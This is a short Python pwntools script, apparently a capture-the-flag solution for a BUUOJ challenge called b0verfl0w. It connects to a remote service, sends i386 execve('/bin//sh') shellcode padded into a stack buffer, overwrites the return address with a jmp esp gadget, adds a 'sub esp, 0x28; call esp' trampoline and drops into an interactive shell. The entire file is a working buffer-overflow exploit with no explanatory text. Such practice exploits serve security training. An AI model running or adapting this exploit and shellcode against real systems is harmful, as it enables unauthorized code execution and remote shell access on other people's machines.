from pwn import *


# p = process("./b0verfl0w")
p = remote("node4.buuoj.cn", 28044)

context(os="linux", arch="i386")

jmp_esp = 0x08048504
code = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

pad = code.ljust(0x24, b"\x00")
pad += p32(jmp_esp)+asm("sub esp, 0x28; call esp")
p.sendline(pad)

p.interactive()


